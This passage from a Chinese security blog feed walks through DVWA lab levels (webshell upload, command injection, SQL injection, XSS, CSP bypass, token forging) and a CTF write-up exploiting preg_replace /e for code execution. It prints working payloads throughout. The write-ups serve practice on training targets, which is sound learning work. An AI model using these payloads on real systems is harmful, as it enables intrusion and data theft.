<img src="/posts/8409/5_4.png" class></p><p>修改Content-Type为允许的：<br>将内容改为image/png，发现上传成功：</p><p> <img src="/posts/8409/5_5.png" class></p><p>使用蚁剑连接，连接成功：</p><pre class="line-numbers language-bash"><code class="language-bash">url:http://127.0.0.1:8099/dvwa/hackable/uploads/shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <img src="/posts/8409/5_6.png" class></p><h2 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h2><p>制作一句话木马：</p><pre class="line-numbers language-bash"><code class="language-bash">copy 2.jpg/b+55.php/a 66.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/8409/5_7.png" class></p><p>上传66.jpg，成功，可以看到路径：</p><p> <img src="/posts/8409/5_8.png" class></p><p>然后利用第2关的命令注入，将66.jpg改成66.php</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">||</span> ren <span class="token punctuation">..</span>\<span class="token punctuation">..</span>\hackable\uploads\66.jpg 66.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再利用蚁剑连接一句话木马：</p><pre class="line-numbers language-bash"><code class="language-bash">url:http://127.0.0.1:8099/dvwa/hackable/uploads/66.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <img src="/posts/8409/5_9.png" class></p><h1 id="6、SQL-Injection"><a href="#6、SQL-Injection" class="headerlink" title="6、SQL Injection"></a>6、SQL Injection</h1><h2 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h2><p>本关存在字符型注入，当输入单引号时，会出现报错信息，可以利用报错注入；输入正常的用户id时会有回显，也可以利用union联合注入。</p><p>下面我采用的是报错注入：</p><h3 id="6-1获得数据库名"><a href="#6-1获得数据库名" class="headerlink" title="6.1获得数据库名"></a>6.1获得数据库名</h3><pre class="line-numbers language-bash"><code class="language-bash">构造payload：1<span class="token string">'or+info()+'</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（此处就是通过构造一个在数据库中不存在的函数info()使其报错，就会出现数据库名）</p><p>可以看到数据库名为dvwa</p><p>  <img src="/posts/8409/6.png" class></p><h3 id="6-2获得数据库用户名"><a href="#6-2获得数据库用户名" class="headerlink" title="6.2获得数据库用户名"></a>6.2获得数据库用户名</h3><p>此时，可以将info()替换成报错函数，查询出其他信息，如数据库用户名：</p><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">'or+updatexml(1,concat(0x7e,user(),0x7e),1)+'</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到数据库用户名为root@localhost</p><p>  <img src="/posts/8409/6_2.png" class></p><h2 id="medium-5"><a href="#medium-5" class="headerlink" title="medium"></a>medium</h2><p>中级的是一个下拉列表，则可能存在数字型的注入。<br>用burp抓包，构造id=2+and+1=1和id=2+and+1=2，结果不一样。<br>一样也采用报错注入：</p><h3 id="6-1获得数据库用户名"><a href="#6-1获得数据库用户名" class="headerlink" title="6.1获得数据库用户名"></a>6.1获得数据库用户名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>2+and+info<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到数据库名为dvwa</p><img src="/posts/8409/6_3.png" class><h3 id="6-2获得数据库用户名-1"><a href="#6-2获得数据库用户名-1" class="headerlink" title="6.2获得数据库用户名"></a>6.2获得数据库用户名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>2+and+updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,concat<span class="token punctuation">(</span>user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到数据库用户名为root@localhost</p><img src="/posts/8409/6_4.png" class><h2 id="high-5"><a href="#high-5" class="headerlink" title="high"></a>high</h2><p>输入奇数个单引号和输入偶数个单引号回显不一样，可以采用基于布尔型的盲注。</p><h3 id="6-1获得数据库用户名-1"><a href="#6-1获得数据库用户名-1" class="headerlink" title="6.1获得数据库用户名"></a>6.1获得数据库用户名</h3><p>获得数据库名的第一个字母</p><pre class="line-numbers language-bash"><code class="language-bash">构造payload：1<span class="token string">'and+substr(user(),1,1)='</span>a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当字母等于’r’时，即回显正确时，会出现如下图，可依次类推其他字母。</p><img src="/posts/8409/6_5.png" class><p>其余不正确的字母都是没有回显：</p><img src="/posts/8409/6_6.png" class><h1 id="7、SQL-Injection-Blind"><a href="#7、SQL-Injection-Blind" class="headerlink" title="7、SQL Injection(Blind)"></a>7、SQL Injection(Blind)</h1><h2 id="low-6"><a href="#low-6" class="headerlink" title="low"></a>low</h2><p>采用盲注，发现输入奇数的单引号和偶数的单引号回显不一样，是字符型的注入：</p><pre class="line-numbers language-bash"><code class="language-bash">构造payload：1<span class="token string">'and+substr(user(),1,1)='</span>a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当字母为’r’时，回显是存在，说明数据库用户名第一个字母为’r’</p><p> <img src="/posts/8409/7.png" class></p><p>当其他不正确的字母时，回显是不存在：</p><p>  <img src="/posts/8409/7_2.png" class></p><h2 id="medium-6"><a href="#medium-6" class="headerlink" title="medium"></a>medium</h2><p>采用盲注，发现输入id=1/1和id=1/0回显不一样，是数字型的注入:</p><pre class="line-numbers language-bash"><code class="language-bash">payload：1+and+ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>user<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>114<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当第一个字母的ascii码值为114，即对应字母’r’时，出现存在信息，说明数据库用户名第一个字母为’r’，可依次类推其他字母。</p><p>  <img src="/posts/8409/7_3.png" class></p><p>当字母不正确时，会出现不存在的回显：</p><p> <img src="/posts/8409/7_4.png" class></p><h2 id="high-6"><a href="#high-6" class="headerlink" title="high"></a>high</h2><p>采用盲注，本关为基于字符型的注入</p><pre class="line-numbers language-bash"><code class="language-bash">payload：1<span class="token string">'and+substr(user(),1,1)='</span>a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当字母等于’r’时，即回显正确时，会出现存在，可依次类推其他字母。</p><p> <img src="/posts/8409/7_5.png" class></p><p>其余不正确的字母都是回显不存在：</p><p> <img src="/posts/8409/7_6.png" class></p><h1 id="8、Weak-Session-IDs"><a href="#8、Weak-Session-IDs" class="headerlink" title="8、Weak Session IDs"></a>8、Weak Session IDs</h1><h2 id="low-7"><a href="#low-7" class="headerlink" title="low"></a>low</h2><p>当用户登录后，在服务器就会创建一个会话(session)，叫做会话控制，接着访问页面的时候就不用登录，只需要携带session去访问。</p><p>sessionID作为特定用户访问站点所需要的唯一内容。如果能够计算或轻易猜到该sessionID，则攻击者将可以轻易获取访问权限，无需录直接进入特定用户界面，进而进行其他操作。</p><p>用burp抓包，可以看到cookie，将cookie复制放到hackbar中验证一下：</p><p>  <img src="/posts/8409/8.png" class></p><p>当删掉这个phpsessid中的某个值时，会退出登录，是完整的时，则在登录状态： </p><p>  <img src="/posts/8409/8_2.png" class></p><h2 id="medium-7"><a href="#medium-7" class="headerlink" title="medium"></a>medium</h2><p>用burp抓包，查看cookie。<br>是基于时间戳生成dvwaSesion的，在网上找到一个转换时间戳工具</p><p> <img src="/posts/8409/8_3.png" class></p><p>转换之后，放到hackbar中</p><p> <img src="/posts/8409/8_4.png" class></p><h2 id="high-7"><a href="#high-7" class="headerlink" title="high"></a>high</h2><p>burp抓包发现，dvwaSesion值很像md5加密，使用md5解密，发现是对从零开始的整数进行加密。</p><p> <img src="/posts/8409/8_5.png" class></p><p>构造payload使用火狐的hackbar提交即可。</p><h1 id="9、XSS-DOM"><a href="#9、XSS-DOM" class="headerlink" title="9、XSS(DOM)"></a>9、XSS(DOM)</h1><h2 id="low-8"><a href="#low-8" class="headerlink" title="low"></a>low</h2><p>页面有一个选择框，任意选择一个时。是get型的，在url中可以看到选择的类型，</p><pre class="line-numbers language-bash"><code class="language-bash">构造payload：<span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>/xss/<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功出现弹窗。</p><p>   <img src="/posts/8409/9.png" class></p><h2 id="medium-8"><a href="#medium-8" class="headerlink" title="medium"></a>medium</h2><p>这里的话要闭合select标签</p><pre class="line-numbers language-bash"><code class="language-bash">payload：使用img标签<span class="token operator">&lt;</span>/select<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>111 onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>/xss/<span class="token punctuation">)</span><span class="token operator">></span>或者使用iframe标签<span class="token operator">&lt;</span>/select<span class="token operator">></span><span class="token operator">&lt;</span>iframe onload<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span> height<span class="token operator">=</span><span class="token string">"0"</span> width<span class="token operator">=</span><span class="token string">"0"</span> /<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>   <img src="/posts/8409/9_2.png" class></p><h2 id="high-8"><a href="#high-8" class="headerlink" title="high"></a>high</h2><p>采用了白名单，采用#可以绕过后台效验</p><pre class="line-numbers language-bash"><code class="language-bash">payload：<span class="token comment" spellcheck="true">#&lt;/select>&lt;img src=111 onerror=alert(/xss/)></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/8409/9_3.png" class></p><p>这里我发现在edge浏览器中可以直接弹出弹窗，而在火狐中不能，于是我在火狐中使用hackbar尝试了一下，发现可以成功：</p><p> <img src="/posts/8409/9_4.png" class></p><h1 id="10、XSS-Reflected"><a href="#10、XSS-Reflected" class="headerlink" title="10、XSS(Reflected)"></a>10、XSS(Reflected)</h1><h2 id="low-9"><a href="#low-9" class="headerlink" title="low"></a>low</h2><pre class="line-numbers language-bash"><code class="language-bash">payload：<span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/8409/10.png" class></p><h2 id="medium-9"><a href="#medium-9" class="headerlink" title="medium"></a>medium</h2><pre class="line-numbers language-bash"><code class="language-bash">payload:<span class="token operator">&lt;</span>a href<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span>xss<span class="token operator">&lt;</span>/a<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>点击下面的超链接即可出现弹窗。</p><p> <img src="/posts/8409/10_2.png" class></p><h2 id="high-9"><a href="#high-9" class="headerlink" title="high"></a>high</h2><pre class="line-numbers language-bash"><code class="language-bash">payload：<span class="token operator">&lt;</span>img src<span class="token operator">=</span>111 onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/8409/10_3.png" class></p><h1 id="11、XSS-Stored"><a href="#11、XSS-Stored" class="headerlink" title="11、XSS(Stored)"></a>11、XSS(Stored)</h1><h2 id="low-10"><a href="#low-10" class="headerlink" title="low"></a>low</h2><p>这是一个留言框，在第二个内容框中输入payload：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>存储型的payload会一直有效，当你再次输入一个正常的留言时，也会弹出弹窗。</p><p>  <img src="/posts/8409/11.png" class></p><h2 id="medium-10"><a href="#medium-10" class="headerlink" title="medium"></a>medium</h2><p>在第二个输入框多次尝试无果，换到第一个输入框，发现有长度限制，用burp抓包，在第一个变量名处输入payload：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>SCRIPT<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/SCRIPT<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="/posts/8409/11_2.png" class></p><p>放包，看到页面成功出现弹窗：</p><p>  <img src="/posts/8409/11_3.png" class></p><h2 id="high-10"><a href="#high-10" class="headerlink" title="high"></a>high</h2><p>用burp抓包，在第一个输入框的变量后面尝试，payload为：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img src<span class="token operator">=</span>111 onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>放包，看到页面成功出现弹窗。</p><p>  <img src="/posts/8409/11_4.png" class></p><h1 id="12、CSP-Bypass"><a href="#12、CSP-Bypass" class="headerlink" title="12、CSP Bypass"></a>12、CSP Bypass</h1><h2 id="low-11"><a href="#low-11" class="headerlink" title="low"></a>low</h2><p>CSP，即内容安全策略。开发者在开发过程中设置了一个类似于白名单的策略，要信任某个页面，哪些外部资源可以执行，哪些不可以，这可以从根本上防御XSS。</p><p>分析页面源码，可以看到设置的白名单：</p><p>   <img src="/posts/8409/12.png" class></p><p>点进一个白名单的链接，构造恶意的payload，可以看到生成了一个链接</p><p>   <img src="/posts/8409/12_2.png" class></p><p>将链接复制到输入框中，可以产生弹窗</p><p>听说由于这个网站是国外的，所以访问比较慢，有可能不会出现弹窗，我就是那个有可能中的一个，没关系，原理知道是这个就行啦。</p><h2 id="medium-11"><a href="#medium-11" class="headerlink" title="medium"></a>medium</h2><p>这里csp限制了nonce,而nonce-source，仅允许特定的内联脚本块。如源码中：nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=’</p><p> <img src="/posts/8409/12_3.png" class></p><p>所以这里可以设置payload：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script nonce<span class="token operator">=</span>TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA<span class="token operator">=</span><span class="token operator">></span>alert<span class="token punctuation">(</span>111<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可成功出现弹窗：</p><p> <img src="/posts/8409/12_4.png" class></p><h2 id="high-11"><a href="#high-11" class="headerlink" title="high"></a>high</h2><p>先看一下csp头部信息，只有script-src ‘self’;即只允许本界面加载JavaScript执行。<br>查看服务器端的源代码，因为生成的script标签中src指向source/jsonp.php?callback=solveNum，然后将它加入到dom节点中。但是我们一般无法修改服务器上的jsonp.php文件，但是可以看到源码中会接收include参数，因此可以利用include参数作为注入点。</p><p> <img src="/posts/8409/12_5.png" class></p><pre class="line-numbers language-bash"><code class="language-bash">构造payload：include<span class="token operator">=</span><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"source/jsonp.php?callback=alert(333);"</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>成功出现弹窗：</p><p> <img src="/posts/8409/12_6.png" class></p><h1 id="13、JavaScript"><a href="#13、JavaScript" class="headerlink" title="13、JavaScript"></a>13、JavaScript</h1><h2 id="low-12"><a href="#low-12" class="headerlink" title="low"></a>low</h2><p>这里的规则是成功提交success算成功。</p><p>在这里输入success和ChangeMe，都显示不对。通过用burp抓包，对比两个的请求包，可以发现它们的token是一样的。</p><p>  <img src="/posts/8409/13.png" class></p><p>所以猜测token可能是前端生成的。查看源码发现的确是在前端生成，且是将rot13加密的结果进行md5加密的结果作为token的值。</p><p>首先在控制台查看正确的token值:</p><p>   <img src="/posts/8409/13_2.png" class></p><p>然后替换掉原来success中错误的，可以看到成功完成：</p><p>  <img src="/posts/8409/13_3.png" class></p><h2 id="medium-12"><a href="#medium-12" class="headerlink" title="medium"></a>medium</h2><p>在这里，输入success和ChangeMe都错误，用burp抓包，分析两者的token区别。同样可以看到token值一样。</p><img src="/posts/8409/13_4.png" class><p>此关中生成token的方式是：“XX”+phrase变量的值+“XX”字符串反转。<br>可以看到ChangeMe的token为：token=XXeMegnahCXX<br>所以只需将success的token改为：token=XXsseccusXX</p><img src="/posts/8409/13_5.png" class><h2 id="high-12"><a href="#high-12" class="headerlink" title="high"></a>high</h2><p>在这里，同样用burp分别抓包，分析两者的token值，发现一样：</p><img src="/posts/8409/13_6.png" class><p>查看源代码发现，这里的token加密引入了一个js文件。<br>先用还原工具（<a href="http://deobfuscatejavascript.com/#%EF%BC%89%E5%B0%86%E6%BA%90%E4%BB%A3%E7%A0%81%E8%BF%98%E5%8E%9F%EF%BC%8C%E6%89%BE%E5%88%B0%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%EF%BC%9A">http://deobfuscatejavascript.com/#）将源代码还原，找到关键代码：</a></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">function</span> do_something<span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>var t <span class="token operator">=</span> <span class="token string">""</span>, n <span class="token operator">=</span> e.length - 1<span class="token punctuation">;</span> n <span class="token operator">>=</span> 0<span class="token punctuation">;</span> n--<span class="token punctuation">)</span> t +<span class="token operator">=</span> e<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> t<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token keyword">function</span> token_part_3<span class="token punctuation">(</span>t, y <span class="token operator">=</span> <span class="token string">"ZZ"</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    document.getElementById<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span>.value <span class="token operator">=</span> sha256<span class="token punctuation">(</span>document.getElementById<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span>.value + y<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token keyword">function</span> token_part_2<span class="token punctuation">(</span>e <span class="token operator">=</span> <span class="token string">"YY"</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    document.getElementById<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span>.value <span class="token operator">=</span> sha256<span class="token punctuation">(</span>e + document.getElementById<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span>.value<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token keyword">function</span> token_part_1<span class="token punctuation">(</span>a, b<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    document.getElementById<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span>.value <span class="token operator">=</span> do_something<span class="token punctuation">(</span>document.getElementById<span class="token punctuation">(</span><span class="token string">"phrase"</span><span class="token punctuation">)</span>.value<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>document.getElementById<span class="token punctuation">(</span><span class="token string">"phrase"</span><span class="token punctuation">)</span>.value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>setTimeout<span class="token punctuation">(</span>function<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    token_part_2<span class="token punctuation">(</span><span class="token string">"XX"</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;, 300);</span>document.getElementById<span class="token punctuation">(</span><span class="token string">"send"</span><span class="token punctuation">)</span>.addEventListener<span class="token punctuation">(</span><span class="token string">"click"</span>, token_part_3<span class="token punctuation">)</span><span class="token punctuation">;</span>token_part_1<span class="token punctuation">(</span><span class="token string">"ABCD"</span>, 44<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行的先后顺序依次是token_part_1，token_part_2（因为有300毫秒的延迟，所以在token_part_1后面），token_part_3（当点击按钮时，触发该事件）。<br>先在输入框中输入success，<br>然后在控制台依次输入：</p><pre class="line-numbers language-bash"><code class="language-bash">token_part_1<span class="token punctuation">(</span><span class="token string">"ABCD"</span>,44<span class="token punctuation">)</span>token_part_2<span class="token punctuation">(</span><span class="token string">"XX"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/posts/8409/13_7.png" class><p>最后点击submit即可成功：</p><img src="/posts/8409/13_8.png" class>]]></content>
    
    
    <categories>
      
      <category>综合靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>Web漏洞</tag>
      
      <tag>dvwa</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-web-ICS-05</title>
    <link href="/posts/dbe4.html"/>
    <url>/posts/dbe4.html</url>
    
    <content type="html"><![CDATA[<p>今天练习了一下攻防世界里面的web靶场，做了一个题目，叫ics-05，主要是关于preg_replace这个函数可能存在命令执行漏洞~~</p><span id="more"></span><h1 id="先前介绍："><a href="#先前介绍：" class="headerlink" title="先前介绍："></a>先前介绍：</h1><h4 id="慎用preg-replace危险的-e修饰符（一句话后门常用）"><a href="#慎用preg-replace危险的-e修饰符（一句话后门常用）" class="headerlink" title="慎用preg_replace危险的/e修饰符（一句话后门常用）"></a>慎用preg_replace危险的/e修饰符（一句话后门常用）</h4><pre class="line-numbers language-bash"><code class="language-bash">preg_replace原型：mixed preg_replace <span class="token punctuation">(</span> mixed pattern, mixed replacement, mixed subject <span class="token punctuation">[</span>, int limit<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>pattern: 要搜索的模式，可以是字符串或一个字符串数组。</p><p>replacement: 用于替换的字符串或字符串数组。</p><p>subject: 要搜索替换的目标字符串或字符串数组。</p><p>preg_replace函数作用：搜索subject中匹配pattern的部分， 以replacement进行替换。</p><p><strong>特别说明：preg_replace函数存在命令执行漏洞。 /e 修正符</strong>使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</p><p>例如：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/test/e"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"h"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"jutst test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当提交h=phpinfo()时，phpinfo()将会被执行。（使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行）。 </p><h1 id="1、-php伪协议读取源码"><a href="#1、-php伪协议读取源码" class="headerlink" title="1、 php伪协议读取源码"></a>1、 php伪协议读取源码</h1><p>看到url中的page=index，将index替换成其他字符串，屏幕则显示其他字符串。猜测page=index中，page这个函数可能存在文件包含漏洞。</p><p>使用php伪协议直接读取代码：</p><pre class="line-numbers language-bash"><code class="language-bash">?page<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：这句话的意思就是我们用base64编码的方式来读取文件index.php</p><img src="/posts/dbe4/1.png" class><h1 id="2、使用base64将代码解密"><a href="#2、使用base64将代码解密" class="headerlink" title="2、使用base64将代码解密"></a>2、使用base64将代码解密</h1><p>使用在线base64解密，将第一步所得到的base64代码进行解密，得到如下关键代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span> <span class="token operator">===</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br >Welcome My Admin ! &lt;br >"</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pat<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$replacement</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>rep<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$subject</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>sub<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$replacement</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$subject</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$replacement</span><span class="token punctuation">,</span> <span class="token variable">$subject</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>preg_replace函数存在命令执行漏洞：使用函数的/e模式，导致代码执行的问题。</p><h1 id="3、命令执行"><a href="#3、命令执行" class="headerlink" title="3、命令执行"></a>3、命令执行</h1><p>根据源码，当X_FORWARDED_FOR改为127.0.0.1之后，然后传入三个参数，对其中的rep参数进行命令执行。</p><p>例如：</p><pre class="line-numbers language-bash"><code class="language-bash">pat<span class="token operator">=</span>/test/e<span class="token operator">&amp;</span>rep<span class="token operator">=</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>sub<span class="token operator">=</span>jutst+test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/dbe4/3.png" class><h1 id="4、获取flag"><a href="#4、获取flag" class="headerlink" title="4、获取flag"></a>4、获取flag</h1><pre class="line-numbers language-bash"><code class="language-bash">使用rep<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/dbe4/4.png" class><p>看到一个文件s3chahahaDir，</p><pre class="line-numbers language-bash"><code class="language-bash">列举里面的文件：rep<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">"ls+s3chahahaDir"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看到flag</p><img src="/posts/dbe4/4_2.png" class><pre class="line-numbers language-bash"><code class="language-bash">进入flag：rep<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">"ls+s3chahahaDir/flag"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/dbe4/4_3.png" class><p>得到flag.php里面的内容：</p><pre class="line-numbers language-bash"><code class="language-bash">rep<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">"cat+s3chahahaDir/flag/flag.php"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/dbe4/4_4.png" class>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web漏洞</tag>
      
      <tag>命令执行漏洞</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache Struts2远程代码执行漏洞(S2-016)</title>
    <link href="/posts/fd38.html"/>
    <url>/posts/fd38.html</url>
    
